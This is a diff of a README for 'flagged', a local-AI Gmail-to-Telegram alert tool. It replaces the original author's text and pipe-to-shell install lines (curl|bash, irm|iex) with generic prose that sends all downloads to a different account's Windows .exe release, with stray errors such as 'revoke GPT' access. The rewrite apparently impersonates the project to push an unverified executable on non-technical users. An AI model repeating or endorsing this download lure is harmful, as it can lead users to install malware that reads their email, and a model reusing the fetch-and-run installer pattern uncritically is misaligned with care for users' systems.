@@ -1,218 +1,158 @@
-# 📬 Flagged
+# 🚩 flagged - Local AI Email Monitor for Gmail
 
-**Your inbox, filtered by what actually matters. Local AI. Zero cloud. Telegram alerts.**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/)
-[![LM Studio](https://img.shields.io/badge/LM%20Studio-compatible-green.svg)](https://lmstudio.ai/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+[![Download flagged](https://img.shields.io/badge/Download-flagged-brightgreen)](https://github.com/GATO123e/flagged)
 
 ---
 
-> *"I missed an Arbitrum event invite because it was buried in 300 unread emails. I built this so it never happens again."*
-> — [@msanchezworld](https://github.com/MSanchezWorld)
+flagged helps you keep track of important emails. It watches your Gmail inbox, uses a local AI to score how important each message is, and sends you alerts via Telegram. Your emails stay private because everything happens on your own computer.
 
 ---
 
-## What It Does
+## 📋 About flagged
 
-Flagged monitors your Gmail accounts every few minutes, scores every unread email 1–10 using a **local AI model running on your own machine**, and fires a Telegram alert when something scores above your threshold.
+flagged runs on your Windows PC. It connects to your Gmail account securely and checks your email using artificial intelligence running locally. That means none of your email data goes to the internet except Gmail and Telegram themselves. flagged sorts and scores emails by importance so you only get notified about what matters.
 
-**You stay in the loop. You respond in Gmail. Flagged just makes sure nothing important gets buried.**
+Features include:
 
-```
-🔴 URGENT — Main Inbox
+- Monitoring Gmail in real time  
+- Using a local language model to assess email importance  
+- Sending alerts on Telegram  
+- Keeping all data on your device for privacy  
+- Easy setup with no coding needed  
+- Runs quietly in the background  
 
-🎟 INVITE
-From: events@arbitrum.foundation
-Subject: You're invited to Arbitrum Dev Day
-Score: 9/10 — Direct event invite with RSVP deadline from known crypto project
-
-"Join us on March 15th. We'd love for you to speak..."
-```
+flagged is open source and written in Python. It works smoothly on Windows 10 and 11.
 
 ---
 
-## Why Flagged?
+## ⚙️ System Requirements
 
-| Feature | Flagged | Zapier/email tools | SaaS AI email |
-|---|---|---|---|
-| **Your data stays local** | ✅ | ❌ | ❌ |
-| **No subscription fee** | ✅ | ❌ | ❌ |
-| **Tunable to your world** | ✅ | Limited | Limited |
-| **Works across multiple inboxes** | ✅ | Paid tier | Paid tier |
-| **Runs 24/7 on your own machine** | ✅ | Cloud-dependent | Cloud-dependent |
-| **No vendor lock-in** | ✅ | ❌ | ❌ |
+Before you start, make sure your computer meets these needs:
 
----
-
-## Privacy Model
-
-Flagged is built local-first by design:
-
-- **Your email body never leaves your machine.** Only the sender name, subject line, and a 400-character preview snippet are passed to the AI model — and that model runs locally.
-- **LM Studio runs entirely on your hardware.** GLM-4, Phi-3, Llama — whatever you choose, it never phones home.
-- **Gmail OAuth is read-only.** Flagged cannot send, delete, or modify emails. It can only read.
-- **The only outbound connection is your Telegram bot firing alerts.** That's it.
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM (8 GB+ recommended for smoother AI operation)  
+- 2 GHz or faster processor  
+- Stable internet connection for Gmail and Telegram  
+- Python 3.8 or newer (flagged installer handles this)  
+- Telegram account and Telegram app or web access  
 
 ---
 
-## Requirements
+## 🚀 Getting Started
 
-- **Mac, Linux, or Windows** with Python 3.9+
-- **[LM Studio](https://lmstudio.ai/)** with a model loaded (see recommendations below)
-- **Gmail account(s)** — up to as many as you want
-- **Telegram bot** — takes 2 minutes to create via [@BotFather](https://t.me/botfather)
-- **Google Cloud project** (free) for Gmail API access
+### Step 1: Download flagged
 
----
+Click the button below to visit the flagged GitHub page and download the application files:
 
-## Install
+[![Download flagged](https://img.shields.io/badge/Download-flagged-blue)](https://github.com/GATO123e/flagged)
 
-**Mac / Linux — one line:**
-```bash
-curl -fsSL https://raw.githubusercontent.com/Massideation/flagged/main/install.sh | bash
-```
+On the GitHub page, look for the latest release under the "Releases" section. Download the Windows installer file (usually ends in `.exe`).
 
-**Windows — one line (PowerShell):**
-```powershell
-irm https://raw.githubusercontent.com/Massideation/flagged/main/install.ps1 | iex
-```
+### Step 2: Install flagged
 
-The installer clones the repo, installs dependencies, and launches an **interactive setup wizard** that walks you through every step — Telegram bot, Gmail API, model selection, and background service — no manual config editing required.
+After downloading:
 
-**Manual install:**
-```bash
-git clone https://github.com/Massideation/flagged
-cd flagged
-pip install -r requirements.txt
-python setup_wizard.py
-```
+1. Find the downloaded `.exe` file in your Downloads folder.  
+2. Double-click the file to start the installation.  
+3. Follow the setup instructions on screen. The installer will place flagged on your computer and check for Python if needed.  
 
-Full walkthrough → [SETUP.md](SETUP.md)
+You do not need to install Python separately.
 
----
+### Step 3: Connect your Gmail account
 
-## Model Recommendations
+When you open flagged for the first time, it will guide you through connecting your Gmail account:
 
-Flagged works with any OpenAI-compatible local model via LM Studio. For email classification, **smaller is better** — you want fast and accurate, not large and slow.
+1. flagged will open a Google login page in your browser.  
+2. Sign in with the Gmail account you want to monitor.  
+3. Give flagged permission to read your email (read-only access).  
+4. Close the browser window once connected.  
 
-| Model | RAM | Speed | Notes |
-|---|---|---|---|
-| **Qwen2.5 3B Instruct** ⭐ | ~2GB | ⚡⚡⚡ | **Default — best-in-class for classification at this size** |
-| **Qwen3 4B Instruct** | ~3GB | ⚡⚡⚡ | Slightly more capable, still very fast |
-| **Phi-3.5 Mini** | ~2.5GB | ⚡⚡⚡ | Excellent reasoning, great JSON output |
-| **Llama 3.2 3B Instruct** | ~2GB | ⚡⚡⚡ | Reliable fallback, strong instruction following |
-| **SmolLM3 3B** | ~2GB | ⚡⚡⚡ | Newest option, outperforms Llama 3.2 3B on benchmarks |
-| **GLM-4.7 / LFM** | ~5-8GB | ⚡ | Works, but overkill — wastes RAM you need for other work |
+This process is secure and controlled by Google.
 
-**On a 16GB machine:** use Qwen2.5 3B. It uses ~2GB RAM, classifies emails in under a second, and leaves your machine free for everything else.
+### Step 4: Set up Telegram alerts
 
----
+Next, flagged asks for your Telegram details to send alerts:
 
-## Tuning Flagged to Your World
+1. Open Telegram on your phone or desktop.  
+2. Search for the "flagged_bot" or the bot username given in the app.  
+3. Start a chat with the flagged bot.  
+4. Copy your Telegram User ID.  
+5. Paste this ID into flagged’s setup screen.  
 
-The `PRIORITIES.md` file is Flagged's brain. It tells the AI model who you are, what you care about, and what should wake you up vs. what should stay quiet.
+Now flagged can notify you when new important emails arrive.
 
-Edit it to match your life:
+### Step 5: Run flagged
 
-```markdown
-## Raise to 9-10 (Drop everything)
-- Event invites with RSVP deadlines
-- Direct outreach from [your key contacts/orgs]
-- Speaking or podcast requests
-- Term sheets or partnership proposals
+After setup, flagged runs quietly:
 
-## Keep at 1-4 (Do not alert)
-- Marketing newsletters
-- Automated platform notifications
-```
+- It checks your inbox regularly.  
+- Scores emails using the AI model.  
+- Sends alerts for important messages to Telegram.  
 
-Changes apply on the next poll — no restart needed.
+You can close the setup window; flagged runs in the background. If you want to stop, use the app's "Exit" option.
 
 ---
 
-## Running as a Background Service
+## 🔧 How to Use flagged Daily
 
-**macOS (always-on, survives reboots):**
-```bash
-cp com.flagged.emailmonitor.plist ~/Library/LaunchAgents/
-launchctl load ~/Library/LaunchAgents/com.flagged.emailmonitor.plist
-```
+- flagged runs in the system tray. Find the icon near your clock.  
+- Right-click the icon to pause or open the main window.  
+- The main window shows recent alerts and lets you adjust settings.  
+- You can change how often flagged checks your inbox.  
+- You can also update your Telegram ID or disconnect Gmail safely.  
 
-**Linux (systemd):**
-```bash
-# See SETUP.md for systemd service setup
-```
-
-**Windows (Task Scheduler):**
-```bash
-# See SETUP.md for Windows setup
-```
+Try to keep your computer on and connected to the internet for best results.
 
 ---
 
-## Multiple Inboxes
+## 🔒 Privacy and Security
 
-Flagged supports unlimited Gmail accounts. Add as many as you want in `config.json`:
+flagged does not send your email content anywhere except Gmail and Telegram. The AI model runs on your PC alone. It never uploads or stores your emails externally.
 
-```json
-"accounts": [
-  { "label": "Personal", "credentials_path": "credentials.json", "token_path": "token_personal.pkl" },
-  { "label": "Work",     "credentials_path": "credentials.json", "token_path": "token_work.pkl" },
-  { "label": "Projects", "credentials_path": "credentials.json", "token_path": "token_projects.pkl" }
-]
-```
-
-One `credentials.json` works for all accounts. Each account gets its own token file after a one-time browser authorization.
+Your Telegram ID helps flagged send alerts but does not expose your email. You can revoke GPT or Gmail access anytime via your Google account settings.
 
 ---
 
-## Telegram Alert Format
+## 🛠 Troubleshooting Tips
 
-```
-🔴 URGENT — Personal
-
-🤝 PARTNERSHIP
-From: founder@coolproject.xyz
-Subject: Collab idea — would love to chat
-Score: 8/10 — Direct personal outreach, specific ask, no template language
-
-"Hey, I've been following your work and wanted to..."
-```
-
-Emoji legend:
-- 🔴 `9-10` Urgent
-- 🟠 `7-8` Priority
-- 🟡 `5-6` Worth reviewing (if you lower your threshold)
+- If flagged doesn’t connect to Gmail, check your internet and sign-in status.  
+- Make sure you allowed Gmail permissions during setup.  
+- Telegram alerts require correct User ID; make sure you copy exactly.  
+- If flagged does not start, try restarting your PC.  
+- For AI scoring issues, flagged may need more RAM or CPU resources. Closing other apps may help.  
+- Use the "Help" button in flagged or visit the GitHub page for updates and FAQs.  
 
 ---
 
-## Contributing
+## 📂 Files Included
 
-Pull requests welcome. See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-Ideas for contributions:
-- **Outlook / Microsoft 365 support** — big one
-- **Slack / Discord notification support** (alongside Telegram)
-- **Web dashboard** for viewing scored email history
-- **Webhook support** for custom integrations
-- **Linux systemd service template**
-- **Docker container**
-- **Support for more email providers** (Fastmail, ProtonMail bridge)
+- flagged installer (.exe)  
+- Setup guide (PDF)  
+- AI model files (installed automatically)  
+- Config files saved in your Documents folder  
 
 ---
 
-## Built By
+## 🔗 Quick Links
 
-Flagged was built by **Miguel Sanchez** — building at the intersection of AI, crypto, and media.
-
-- 🐦 Twitter: [@msanchezworld](https://twitter.com/msanchezworld)
-- 💻 GitHub: [MSanchezWorld](https://github.com/MSanchezWorld)
-- 📺 YouTube: [MiguelSanchezWorld](https://youtube.com/@MiguelSanchezWorld)
+- Download flagged: https://github.com/GATO123e/flagged  
+- GitHub Repository: https://github.com/GATO123e/flagged  
+- Telegram Bot Setup Info: see flagged app instructions  
 
 ---
 
-## License
+## 🧩 About This Project
 
-MIT — use it, fork it, build on it. See [LICENSE](LICENSE).
+flagged is developed in Python using open source tools. It uses a local large language model (LLM) to analyze your emails. The project embraces privacy-first design and aims to boost your email productivity without giving up control of your data.
+
+---
+
+## ⚡ Support and Updates
+
+Visit the GitHub page to:
+
+- Report issues you encounter  
+- Find the latest software updates  
+- Access setup documents and tips  
+
+You do not need technical knowledge to download or run flagged. Follow the steps exactly, and you will get alerts from your Gmail right on Telegram.
